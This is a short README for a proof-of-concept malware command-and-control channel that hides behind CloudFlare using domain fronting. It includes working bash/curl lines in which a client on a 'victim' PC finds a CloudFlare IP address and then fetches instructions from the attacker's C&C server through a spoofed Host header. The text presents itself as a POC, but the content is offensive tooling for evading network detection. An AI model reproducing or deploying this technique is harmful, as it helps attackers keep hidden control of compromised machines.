# CloudFlare C&C POC
Before to start, let me say that I'm not a super expert on how to write a C&C client-server. This want to be a POC on how a Malware can hide behind a "fake" CloudFlare domain (see this post for more information: https://medium.com/@themiddleblue/cloudflare-domain-fronting-an-easy-way-to-reach-and-hide-a-malware-c-c-786255f0f437)

![](http://i.imgur.com/ZTsKokU.gif)

### How it work
The client, on the "Victim" PC, is a bash script that uses cURL to connect to CloudFlare and OpenSSL to encrypt all communications from and to CloudFlare/C&C. It simply make 2 HTTP request each *n* seconds: The first one, in order to discover a CloudFlare IP address, try to connect to a "real" CloudFlare website. The second one, make a fake request to CloudFlare to reach our C&C.

```bash
# get any usable CloudFlare IP address
CFIP=$(curl -v -I http://medium.com 2>&1 | egrep -o '\d+\.\d+\.\d+\.\d+' | head -1)

# get updates from my C&C
curl -H "Host: myfakedomain.com" "http://${CFIP}/?nocache=`date +%s`"
```

![hiw](http://i.imgur.com/hYzqMWx.png)


![ws](http://i.imgur.com/ilVKfgV.png)
